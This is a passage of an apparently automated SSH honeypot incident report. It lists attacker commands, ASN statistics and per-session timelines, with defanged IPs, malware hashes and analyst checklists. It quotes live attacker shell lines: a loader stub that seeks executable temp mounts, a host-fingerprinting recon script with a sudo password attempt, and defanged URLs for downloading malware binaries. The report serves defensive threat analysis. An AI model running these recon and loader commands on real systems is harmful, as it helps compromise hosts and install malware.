WORK=$(cat /proc/mounts 2>/dev/null | grep -v noexec | awk '{print $2}' | grep -E '^(/tmp|/dev/shm|/var/run|/mnt)' | head -1)
```
```
cat /proc/mounts 2 > /dev/null | grep -v noexec | awk {print $2} | grep -E ^(/tmp | /dev/shm | /var/run | /mnt
```
```
WORK=${WORK:-/tmp}
```
```
cd $WORK || cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /root || cd /
```
```
ulimit -n 99999 2>/dev/null
```
Source IPs: `192.142.28.77`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ;
```
```
uname -s -v -n -m 2 > /dev/null
```
```
uname -m 2 > /dev/null
```
```
cat /proc/uptime 2 > /dev/null | cut -d. -f1
```
```
echo '!root' | sudo -S bash -c 'm=0; while read k v r; do [ "$k" = MemTotal: ] && { m=$v; break; }; done < /proc/meminfo 2>/dev/null; [ "$m" -gt 1048576 ] 2>/dev/null && echo 1 || echo 0' || bash -c 'm=0; while read k v r; do [ "$k" = MemTotal: ] && { m=$v; break; }; done < /proc/meminfo 2>/dev/null; [ "$m" -gt 1048576 ] 2>/dev/null && echo 1 || echo 0'
```
Source IPs: `91.92.40.13`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **21** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 7 | LOW |
| `AS213412` | ONYPHE SAS | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS146817` | Hubei Feixun Network Co., Ltd | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (339)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-19ecfb55655a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:55 |
| **Last Seen** | 2026-06-25 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:55:24` | `cowrie.session.connect` |
| `2026-06-25 16:55:24` | `cowrie.client.version` |
| `2026-06-25 16:55:24` | `cowrie.client.kex` |
| `2026-06-25 16:55:25` | `cowrie.login.success` |
| `2026-06-25 16:55:26` | `cowrie.session.params` |
| `2026-06-25 16:55:26` | `cowrie.command.input` |
| `2026-06-25 16:55:26` | `cowrie.log.closed` |
| `2026-06-25 16:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94075426fcab

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:56 |
| **Last Seen** | 2026-06-25 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:56:15` | `cowrie.session.connect` |
| `2026-06-25 16:56:15` | `cowrie.client.version` |
| `2026-06-25 16:56:15` | `cowrie.client.kex` |
| `2026-06-25 16:56:15` | `cowrie.login.success` |
| `2026-06-25 16:56:16` | `cowrie.session.params` |
| `2026-06-25 16:56:16` | `cowrie.command.input` |
| `2026-06-25 16:56:16` | `cowrie.log.closed` |
| `2026-06-25 16:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a  (ELF Binary (Linux executable))
   SHA256: 3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21d...
   Score : 85/100  |  VT: 39/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Download via TFTP: tftp
   ↳ Download via ftpget: ftpget
   File  : 88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6  (ELF Binary (Linux executable))
   SHA256: 88d028a54a136782982817d1d93c89b075b7f04897b0c068...
   Score : 87/100  |  VT: 42/74
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Download via TFTP: tftp
   ↳ Download via ftpget: ftpget
   File  : c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928  (ELF Binary (Linux executable))
   SHA256: c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f...
   Score : 85/100  |  VT: 39/74
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Download via TFTP: tftp
   ↳ Download via ftpget: ftpget
```

### 🔴 HIGH · IR-25f91d1f1c21

| Field | Detail |
|---|---|
| **Source IP** | `192.142.28[.]77` |
| **First Seen** | 2026-06-25 16:56 |
| **Last Seen** | 2026-06-25 16:57 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `WORK=$(cat /proc/mounts 2>/dev/null | grep -v noexec | awk '{print $2}' | grep -E '^(/tmp|/dev/shm|/var/run|/mnt)' | head -1), cat /proc/mounts 2 > /dev/null | grep -v noexec | awk {print $2} | grep -E ^(/tmp | /dev/shm | /var/run | /mnt, WORK=${WORK:-/tmp}, cd $WORK || cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /root || cd /, ulimit -n 99999 2>/dev/null` |
| **Download Attempts** | hxxp://192.142.28[.]77/bachekuni/ohshit.x86, hxxp://192.142.28[.]77/bachekuni/ohshit.x86, hxxp://192.142.28[.]77/bachekuni/ohshit.x86_64 |
| **Malware Analysis** | 3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a (HIGH), 88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6 (HIGH), c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928 (HIGH) |
| **TTPs (MITRE)** | T1057 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:56:44` | `cowrie.session.connect` |
| `2026-06-25 16:56:44` | `cowrie.login.success` |
| `2026-06-25 16:56:45` | `cowrie.session.params` |
| `2026-06-25 16:56:45` | `cowrie.command.input` |
| `2026-06-25 16:56:45` | `cowrie.command.input` |
| `2026-06-25 16:56:45` | `cowrie.command.failed` |
| `2026-06-25 16:56:45` | `cowrie.command.input` |
| `2026-06-25 16:56:45` | `cowrie.command.input` |
| `2026-06-25 16:56:46` | `cowrie.command.input` |
| `2026-06-25 16:56:46` | `cowrie.command.input` |
| `2026-06-25 16:56:47` | `cowrie.command.input` |
| `2026-06-25 16:56:47` | `cowrie.command.failed` |
| `2026-06-25 16:56:47` | `cowrie.command.input` |
| `2026-06-25 16:56:48` | `cowrie.session.file_download` |
| `2026-06-25 16:56:48` | `cowrie.session.file_download` |
| `2026-06-25 16:56:48` | `cowrie.command.input` |
| `2026-06-25 16:56:48` | `cowrie.command.success` |
| `2026-06-25 16:56:48` | `cowrie.command.input` |
| `2026-06-25 16:56:48` | `cowrie.command.input` |
| `2026-06-25 16:56:48` | `cowrie.command.input` |
| `2026-06-25 16:56:49` | `cowrie.command.input` |
| `2026-06-25 16:56:49` | `cowrie.session.file_download` |
| `2026-06-25 16:56:49` | `cowrie.session.file_download` |
| `2026-06-25 16:56:49` | `cowrie.command.input` |
| `2026-06-25 16:56:49` | `cowrie.command.success` |
| `2026-06-25 16:56:49` | `cowrie.command.input` |
| `2026-06-25 16:56:49` | `cowrie.command.success` |
| `2026-06-25 16:56:49` | `cowrie.command.input` |
| `2026-06-25 16:56:49` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.failed` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.failed` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.failed` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.failed` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.failed` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.failed` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.failed` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.failed` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.failed` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.failed` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.failed` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.failed` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.command.input` |
| `2026-06-25 16:56:50` | `cowrie.session.file_download` |
| `2026-06-25 16:56:51` | `cowrie.command.input` |
| `2026-06-25 16:56:51` | `cowrie.command.success` |
| `2026-06-25 16:56:51` | `cowrie.command.input` |
| `2026-06-25 16:56:51` | `cowrie.command.success` |
| `2026-06-25 16:56:51` | `cowrie.command.input` |
| `2026-06-25 16:56:51` | `cowrie.command.input` |
| `2026-06-25 16:56:51` | `cowrie.command.input` |
| `2026-06-25 16:56:52` | `cowrie.command.input` |
| `2026-06-25 16:56:52` | `cowrie.command.success` |
| `2026-06-25 16:56:52` | `cowrie.command.success` |
| `2026-06-25 16:56:52` | `cowrie.command.input` |
| `2026-06-25 16:56:52` | `cowrie.command.success` |
| `2026-06-25 16:56:53` | `cowrie.command.input` |
| `2026-06-25 16:56:53` | `cowrie.command.failed` |
| `2026-06-25 16:56:53` | `cowrie.command.failed` |
| `2026-06-25 16:56:53` | `cowrie.command.failed` |
| `2026-06-25 16:56:53` | `cowrie.command.success` |
| `2026-06-25 16:56:53` | `cowrie.command.input` |
| `2026-06-25 16:56:53` | `cowrie.command.input` |
| `2026-06-25 16:56:53` | `cowrie.command.success` |
| `2026-06-25 16:56:53` | `cowrie.command.success` |
| `2026-06-25 16:56:54` | `cowrie.command.input` |
| `2026-06-25 16:56:54` | `cowrie.command.success` |
| `2026-06-25 16:56:54` | `cowrie.command.input` |
| `2026-06-25 16:56:54` | `cowrie.command.failed` |
| `2026-06-25 16:56:54` | `cowrie.command.failed` |
| `2026-06-25 16:56:54` | `cowrie.command.failed` |
| `2026-06-25 16:56:54` | `cowrie.command.success` |
| `2026-06-25 16:56:55` | `cowrie.command.input` |
| `2026-06-25 16:56:55` | `cowrie.command.input` |
| `2026-06-25 16:56:55` | `cowrie.command.success` |
| `2026-06-25 16:56:55` | `cowrie.command.success` |
| `2026-06-25 16:56:55` | `cowrie.command.input` |
| `2026-06-25 16:56:55` | `cowrie.command.success` |
| `2026-06-25 16:56:56` | `cowrie.command.input` |
| `2026-06-25 16:56:56` | `cowrie.command.failed` |
| `2026-06-25 16:56:56` | `cowrie.command.failed` |
| `2026-06-25 16:56:56` | `cowrie.command.failed` |
| `2026-06-25 16:56:56` | `cowrie.command.success` |
| `2026-06-25 16:56:56` | `cowrie.command.input` |
| `2026-06-25 16:56:57` | `cowrie.command.input` |
| `2026-06-25 16:56:57` | `cowrie.command.success` |
| `2026-06-25 16:56:57` | `cowrie.command.success` |
| `2026-06-25 16:56:57` | `cowrie.command.input` |
| `2026-06-25 16:56:57` | `cowrie.command.success` |
| `2026-06-25 16:56:58` | `cowrie.command.input` |
| `2026-06-25 16:56:58` | `cowrie.command.failed` |
| `2026-06-25 16:56:58` | `cowrie.command.failed` |
| `2026-06-25 16:56:58` | `cowrie.command.failed` |
| `2026-06-25 16:56:58` | `cowrie.command.success` |
| `2026-06-25 16:56:58` | `cowrie.command.input` |
| `2026-06-25 16:56:58` | `cowrie.command.input` |
| `2026-06-25 16:56:58` | `cowrie.command.success` |
| `2026-06-25 16:56:58` | `cowrie.command.success` |
| `2026-06-25 16:56:59` | `cowrie.command.input` |
| `2026-06-25 16:56:59` | `cowrie.command.success` |
| `2026-06-25 16:56:59` | `cowrie.command.input` |
| `2026-06-25 16:56:59` | `cowrie.command.failed` |
| `2026-06-25 16:56:59` | `cowrie.command.failed` |
| `2026-06-25 16:56:59` | `cowrie.command.failed` |
| `2026-06-25 16:56:59` | `cowrie.command.success` |
| `2026-06-25 16:57:00` | `cowrie.command.input` |
| `2026-06-25 16:57:00` | `cowrie.command.input` |
| `2026-06-25 16:57:00` | `cowrie.command.success` |
| `2026-06-25 16:57:00` | `cowrie.command.success` |
| `2026-06-25 16:57:00` | `cowrie.command.input` |
| `2026-06-25 16:57:00` | `cowrie.command.success` |
| `2026-06-25 16:57:01` | `cowrie.command.input` |
| `2026-06-25 16:57:01` | `cowrie.command.failed` |
| `2026-06-25 16:57:01` | `cowrie.command.failed` |
| `2026-06-25 16:57:01` | `cowrie.command.failed` |
| `2026-06-25 16:57:01` | `cowrie.command.success` |
| `2026-06-25 16:57:01` | `cowrie.command.input` |
| `2026-06-25 16:57:02` | `cowrie.command.input` |
| `2026-06-25 16:57:02` | `cowrie.command.success` |
| `2026-06-25 16:57:02` | `cowrie.command.success` |
| `2026-06-25 16:57:02` | `cowrie.command.input` |
| `2026-06-25 16:57:02` | `cowrie.command.success` |
| `2026-06-25 16:57:02` | `cowrie.command.input` |
| `2026-06-25 16:57:02` | `cowrie.command.failed` |
| `2026-06-25 16:57:02` | `cowrie.command.failed` |
| `2026-06-25 16:57:02` | `cowrie.command.failed` |
| `2026-06-25 16:57:02` | `cowrie.command.success` |
| `2026-06-25 16:57:03` | `cowrie.command.input` |
| `2026-06-25 16:57:03` | `cowrie.command.input` |
| `2026-06-25 16:57:03` | `cowrie.command.success` |
| `2026-06-25 16:57:03` | `cowrie.command.success` |
| `2026-06-25 16:57:04` | `cowrie.command.input` |
| `2026-06-25 16:57:04` | `cowrie.command.success` |
| `2026-06-25 16:57:04` | `cowrie.command.input` |
| `2026-06-25 16:57:04` | `cowrie.command.failed` |
| `2026-06-25 16:57:04` | `cowrie.command.failed` |
| `2026-06-25 16:57:04` | `cowrie.command.failed` |
| `2026-06-25 16:57:04` | `cowrie.command.success` |
| `2026-06-25 16:57:04` | `cowrie.command.input` |
| `2026-06-25 16:57:05` | `cowrie.command.input` |
| `2026-06-25 16:57:05` | `cowrie.command.success` |
| `2026-06-25 16:57:05` | `cowrie.command.success` |
| `2026-06-25 16:57:05` | `cowrie.command.input` |
| `2026-06-25 16:57:05` | `cowrie.command.success` |
| `2026-06-25 16:57:06` | `cowrie.command.input` |
| `2026-06-25 16:57:06` | `cowrie.command.failed` |
| `2026-06-25 16:57:06` | `cowrie.command.failed` |
| `2026-06-25 16:57:06` | `cowrie.command.failed` |
| `2026-06-25 16:57:06` | `cowrie.command.success` |
| `2026-06-25 16:57:06` | `cowrie.command.input` |
| `2026-06-25 16:57:06` | `cowrie.command.input` |
| `2026-06-25 16:57:06` | `cowrie.command.success` |
| `2026-06-25 16:57:06` | `cowrie.command.success` |
| `2026-06-25 16:57:07` | `cowrie.command.input` |
| `2026-06-25 16:57:07` | `cowrie.command.success` |
| `2026-06-25 16:57:08` | `cowrie.command.input` |
| `2026-06-25 16:57:08` | `cowrie.command.failed` |
| `2026-06-25 16:57:08` | `cowrie.command.failed` |
| `2026-06-25 16:57:08` | `cowrie.command.failed` |
| `2026-06-25 16:57:08` | `cowrie.command.success` |
| `2026-06-25 16:57:08` | `cowrie.command.input` |
| `2026-06-25 16:57:08` | `cowrie.command.input` |
| `2026-06-25 16:57:08` | `cowrie.command.success` |
| `2026-06-25 16:57:08` | `cowrie.command.success` |
| `2026-06-25 16:57:08` | `cowrie.command.input` |
| `2026-06-25 16:57:08` | `cowrie.command.success` |
| `2026-06-25 16:57:09` | `cowrie.command.input` |
| `2026-06-25 16:57:09` | `cowrie.command.failed` |
| `2026-06-25 16:57:09` | `cowrie.command.failed` |
| `2026-06-25 16:57:09` | `cowrie.command.failed` |
| `2026-06-25 16:57:09` | `cowrie.command.success` |
| `2026-06-25 16:57:09` | `cowrie.command.input` |
| `2026-06-25 16:57:10` | `cowrie.command.input` |
| `2026-06-25 16:57:10` | `cowrie.command.success` |
| `2026-06-25 16:57:10` | `cowrie.command.success` |
| `2026-06-25 16:57:10` | `cowrie.command.input` |
| `2026-06-25 16:57:10` | `cowrie.command.success` |
| `2026-06-25 16:57:10` | `cowrie.command.input` |
| `2026-06-25 16:57:10` | `cowrie.command.failed` |
| `2026-06-25 16:57:10` | `cowrie.command.failed` |
| `2026-06-25 16:57:10` | `cowrie.command.failed` |
| `2026-06-25 16:57:10` | `cowrie.command.success` |
| `2026-06-25 16:57:11` | `cowrie.command.input` |
| `2026-06-25 16:57:11` | `cowrie.command.input` |
| `2026-06-25 16:57:11` | `cowrie.command.success` |
| `2026-06-25 16:57:11` | `cowrie.command.success` |
| `2026-06-25 16:57:12` | `cowrie.command.input` |
| `2026-06-25 16:57:12` | `cowrie.command.success` |
| `2026-06-25 16:57:12` | `cowrie.command.input` |
| `2026-06-25 16:57:12` | `cowrie.command.failed` |
| `2026-06-25 16:57:12` | `cowrie.command.failed` |
| `2026-06-25 16:57:12` | `cowrie.command.failed` |
| `2026-06-25 16:57:12` | `cowrie.command.success` |
| `2026-06-25 16:57:12` | `cowrie.command.input` |
| `2026-06-25 16:57:13` | `cowrie.command.input` |
| `2026-06-25 16:57:13` | `cowrie.command.success` |
| `2026-06-25 16:57:13` | `cowrie.command.success` |
| `2026-06-25 16:57:13` | `cowrie.command.input` |
| `2026-06-25 16:57:13` | `cowrie.command.success` |
| `2026-06-25 16:57:14` | `cowrie.command.input` |
| `2026-06-25 16:57:14` | `cowrie.command.failed` |
| `2026-06-25 16:57:14` | `cowrie.command.failed` |
| `2026-06-25 16:57:14` | `cowrie.command.failed` |
| `2026-06-25 16:57:14` | `cowrie.command.success` |
| `2026-06-25 16:57:14` | `cowrie.command.input` |
| `2026-06-25 16:57:14` | `cowrie.command.input` |
| `2026-06-25 16:57:14` | `cowrie.command.success` |
| `2026-06-25 16:57:14` | `cowrie.command.success` |
| `2026-06-25 16:57:21` | `cowrie.log.closed` |
| `2026-06-25 16:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.142.28[.]77` to AbuseIPDB if not already reported
- [ ] Block `192.142.28[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ee7f950b2a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:57 |
| **Last Seen** | 2026-06-25 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:57:06` | `cowrie.session.connect` |
| `2026-06-25 16:57:06` | `cowrie.client.version` |
| `2026-06-25 16:57:06` | `cowrie.client.kex` |
| `2026-06-25 16:57:07` | `cowrie.login.success` |
| `2026-06-25 16:57:08` | `cowrie.session.params` |
| `2026-06-25 16:57:08` | `cowrie.command.input` |
| `2026-06-25 16:57:08` | `cowrie.log.closed` |
| `2026-06-25 16:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bf81c0ef80d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:58 |
| **Last Seen** | 2026-06-25 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:58:00` | `cowrie.session.connect` |
| `2026-06-25 16:58:00` | `cowrie.client.version` |
| `2026-06-25 16:58:00` | `cowrie.client.kex` |
| `2026-06-25 16:58:01` | `cowrie.login.success` |
| `2026-06-25 16:58:01` | `cowrie.session.params` |
| `2026-06-25 16:58:01` | `cowrie.command.input` |
| `2026-06-25 16:58:01` | `cowrie.log.closed` |
| `2026-06-25 16:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4551235a8ab2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 16:58 |
| **Last Seen** | 2026-06-25 16:58 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:58:18` | `cowrie.session.connect` |
| `2026-06-25 16:58:20` | `cowrie.client.version` |
| `2026-06-25 16:58:20` | `cowrie.client.kex` |
| `2026-06-25 16:58:26` | `cowrie.login.success` |
| `2026-06-25 16:58:30` | `cowrie.session.params` |
| `2026-06-25 16:58:30` | `cowrie.command.input` |
| `2026-06-25 16:58:32` | `cowrie.log.closed` |
| `2026-06-25 16:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-407e7ff644aa

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:58 |
| **Last Seen** | 2026-06-25 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:58:54` | `cowrie.session.connect` |
| `2026-06-25 16:58:54` | `cowrie.client.version` |
| `2026-06-25 16:58:54` | `cowrie.client.kex` |
| `2026-06-25 16:58:55` | `cowrie.login.success` |
| `2026-06-25 16:58:56` | `cowrie.session.params` |
| `2026-06-25 16:58:56` | `cowrie.command.input` |
| `2026-06-25 16:58:56` | `cowrie.log.closed` |
| `2026-06-25 16:58:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d90602ca739

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 16:59 |
| **Last Seen** | 2026-06-25 16:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:59:40` | `cowrie.session.connect` |
| `2026-06-25 16:59:40` | `cowrie.client.version` |
| `2026-06-25 16:59:40` | `cowrie.client.kex` |
| `2026-06-25 16:59:40` | `cowrie.login.success` |
| `2026-06-25 16:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a3a375ef95

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 16:59 |
| **Last Seen** | 2026-06-25 16:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:59:41` | `cowrie.session.connect` |
| `2026-06-25 16:59:41` | `cowrie.client.version` |
| `2026-06-25 16:59:41` | `cowrie.client.kex` |
| `2026-06-25 16:59:41` | `cowrie.login.success` |
| `2026-06-25 16:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb5d61bafc81

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 16:59 |
| **Last Seen** | 2026-06-25 16:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:59:42` | `cowrie.session.connect` |
| `2026-06-25 16:59:42` | `cowrie.client.version` |
| `2026-06-25 16:59:42` | `cowrie.client.kex` |
| `2026-06-25 16:59:42` | `cowrie.login.success` |
| `2026-06-25 16:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90a3bfe51e77

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:59 |
| **Last Seen** | 2026-06-25 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:59:48` | `cowrie.session.connect` |
| `2026-06-25 16:59:48` | `cowrie.client.version` |
| `2026-06-25 16:59:48` | `cowrie.client.kex` |
| `2026-06-25 16:59:49` | `cowrie.login.success` |
| `2026-06-25 16:59:49` | `cowrie.session.params` |
| `2026-06-25 16:59:49` | `cowrie.command.input` |
| `2026-06-25 16:59:49` | `cowrie.log.closed` |
| `2026-06-25 16:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9152e6775d34

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 16:59 |
| **Last Seen** | 2026-06-25 16:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**
